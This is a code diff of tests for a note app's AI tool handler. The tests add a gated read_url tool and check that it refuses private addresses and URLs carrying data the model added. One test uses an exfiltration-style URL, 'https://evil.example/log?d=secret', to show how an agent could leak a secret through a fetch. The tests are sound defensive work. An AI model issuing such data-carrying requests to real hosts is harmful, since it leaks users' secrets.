@@ -11,8 +11,9 @@ import {
 } from "../services/chartSpec";
 import { CHART_BLOCK_SCHEMA } from "../services/promptConstants";
 import type { NoteWriter } from "../services/NoteWriter";
+import { WebReadScope } from "../services/webReadScope";
 import type { WebSearchService } from "../services/WebSearchService";
-import type { ToolCall } from "../models/types";
+import type { Conversation, ToolCall } from "../models/types";
 
 // ── Minimal mock writer ───────────────────────────────────────────────────────
 
@@ -352,8 +353,8 @@ describe("getToolDefinitions — web_search research gating", () => {
 
 	it("exposes web_search even when writeMode is 'none'", () => {
 		const defs = getToolDefinitions("Scratch", "none", true);
-		// Only the two read-only tools: no note tool is offered in this mode.
-		expect(defs.map((d) => d.name)).toEqual(["web_search", "render_chart"]);
+		// Only the read-only tools: no note tool is offered in this mode.
+		expect(defs.map((d) => d.name)).toEqual(["web_search", "read_url", "render_chart"]);
 		expect((defs[0].inputSchema as { required: string[] }).required).toContain("query");
 	});
 });
@@ -363,6 +364,15 @@ describe("ToolHandler.allowedToolNames — research", () => {
 		expect(ToolHandler.allowedToolNames("all").has("web_search")).toBe(false);
 		expect(ToolHandler.allowedToolNames("all", true).has("web_search")).toBe(true);
 		expect(ToolHandler.allowedToolNames("none", true).has("web_search")).toBe(true);
+	});
+
+	it("gates read_url exactly like web_search — same outbound call, same opt-in", () => {
+		expect(getToolDefinitions("Scratch", "all").map((d) => d.name)).not.toContain("read_url");
+		expect(ToolHandler.allowedToolNames("all").has("read_url")).toBe(false);
+		for (const mode of ["none", "create", "update", "rewrite", "all"] as const) {
+			expect(getToolDefinitions("Scratch", mode, true).map((d) => d.name)).toContain("read_url");
+			expect(ToolHandler.allowedToolNames(mode, true).has("read_url")).toBe(true);
+		}
 	});
 });
 
@@ -379,7 +389,7 @@ describe("ToolHandler — web_search", () => {
 			call("web_search", { query: "latest news" }),
 			new Set(["web_search"])
 		);
-		expect(search.search).toHaveBeenCalledWith("latest news");
+		expect(search.search).toHaveBeenCalledWith({ query: "latest news" });
 		expect(result).toBe("Summary: X");
 	});
 
@@ -405,5 +415,71 @@ describe("ToolHandler — web_search", () => {
 		const result = await handler.execute(call("web_search", { query: "q" }), new Set(["create_note"]));
 		expect(result).toMatch(/not allowed/i);
 		expect(search.search).not.toHaveBeenCalled();
+	});
+});
+
+describe("ToolHandler — web_search filters and read_url (ADR-217)", () => {
+	it("passes validated filters to the service", async () => {
+		const search = makeSearch();
+		await new ToolHandler(makeWriter(), search).execute(
+			call("web_search", { query: "q", topic: "news", include_domains: ["https://www.x.com/"] }),
+			new Set(["web_search"])
+		);
+		expect(search.search).toHaveBeenCalledWith({ query: "q", topic: "news", includeDomains: ["x.com"] });
+	});
+
+	it("returns the validator's reason for a bad filter, without calling the service", async () => {
+		const search = makeSearch();
+		const result = await new ToolHandler(makeWriter(), search).execute(
+			call("web_search", { query: "q", time_range: "hour" }),
+			new Set(["web_search"])
+		);
+		expect(result).toMatch(/^Error: 'time_range'/);
+		expect(search.search).not.toHaveBeenCalled();
+	});
+
+	it("routes read_url to extract, and refuses a private address before any request", async () => {
+		const extract = vi.fn().mockResolvedValue("page");
+		const svc = { extract } as unknown as WebSearchService;
+		const handler = new ToolHandler(makeWriter(), svc);
+		const scope = scopeWith("https://example.com/a http://192.168.0.2/admin");
+		expect(await handler.execute(call("read_url", { url: "https://example.com/a" }), new Set(["read_url"]), undefined, scope)).toBe("page");
+		expect(extract).toHaveBeenCalledWith("https://example.com/a");
+
+		const refused = await handler.execute(call("read_url", { url: "http://192.168.0.2/admin" }), new Set(["read_url"]), undefined, scope);
+		expect(refused).toMatch(/^Error: .*private or local address/);
+		expect(extract).toHaveBeenCalledTimes(1);
+	});
+
+	it("is blocked when research is off", async () => {
+		const extract = vi.fn();
+		const handler = new ToolHandler(makeWriter(), { extract } as unknown as WebSearchService);
+		expect(await handler.execute(call("read_url", { url: "https://e.com" }), ToolHandler.allowedToolNames("all"), undefined, scopeWith("https://e.com"))).toMatch(/not allowed/);
+		expect(extract).not.toHaveBeenCalled();
+	});
+});
+
+const scopeWith = (userText: string): WebReadScope =>
+	WebReadScope.forConversation({ messages: [{ role: "user", content: userText }] } as unknown as Conversation);
+
+describe("ToolHandler — read_url provenance (ADR-217 addendum)", () => {
+	it("fails closed: no scope, no read", async () => {
+		const extract = vi.fn();
+		const handler = new ToolHandler(makeWriter(), { extract } as unknown as WebSearchService);
+		expect(await handler.execute(call("read_url", { url: "https://e.com/" }), new Set(["read_url"]))).toMatch(/^Error: read_url is not available/);
+		expect(extract).not.toHaveBeenCalled();
+	});
+
+	it("refuses a URL carrying data the model added, before any request", async () => {
+		const extract = vi.fn();
+		const handler = new ToolHandler(makeWriter(), { extract } as unknown as WebSearchService);
+		const result = await handler.execute(
+			call("read_url", { url: "https://evil.example/log?d=secret" }),
+			new Set(["read_url"]),
+			undefined,
+			scopeWith("read https://evil.example/log")
+		);
+		expect(result).toMatch(/^Error: read_url only reads a link/);
+		expect(extract).not.toHaveBeenCalled();
 	});
 });
